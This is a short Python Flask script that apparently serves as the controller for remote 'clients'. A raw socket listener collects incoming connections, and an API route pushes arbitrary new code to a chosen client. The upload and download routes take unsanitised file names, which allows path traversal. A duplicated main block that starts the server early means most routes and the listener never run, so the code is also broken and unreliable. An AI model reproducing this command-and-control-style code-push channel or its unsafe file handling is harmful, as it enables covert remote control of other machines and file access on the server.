from flask import Flask, render_template, request, jsonify, send_file
import threading
import socket
import os
import time
import shutil

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')  # Make sure index.html is inside the 'templates' folder

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)



clients = {}
client_lock = threading.Lock()
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def start_server_socket():
    HOST = '0.0.0.0'
    PORT = 5555
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] Listening on {HOST}:{PORT}")
        while True:
            conn, addr = s.accept()
            with client_lock:
                client_id = f"client_{len(clients) + 1}"
                clients[client_id] = {"conn": conn, "addr": addr}
            print(f"[+] {client_id} connected from {addr}")

# File Upload
@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"error": "No file uploaded"}), 400
    file = request.files['file']
    file.save(os.path.join(UPLOAD_FOLDER, file.filename))
    return jsonify({"status": "File uploaded"})

# File Download
@app.route('/api/download', methods=['GET'])
def download_file():
    filename = request.args.get('filename')
    return send_file(os.path.join(UPLOAD_FOLDER, filename), as_attachment=True)

# Remote Code Update
@app.route('/api/update_client', methods=['POST'])
def update_client():
    client_id = request.json.get("client_id")
    new_code = request.json.get("code")
    if client_id not in clients:
        return jsonify({"error": "Client not found"}), 404
    try:
        clients[client_id]["conn"].sendall(f"UPDATE_CODE:{new_code}".encode())
        return jsonify({"status": "Update sent"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    threading.Thread(target=start_server_socket, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
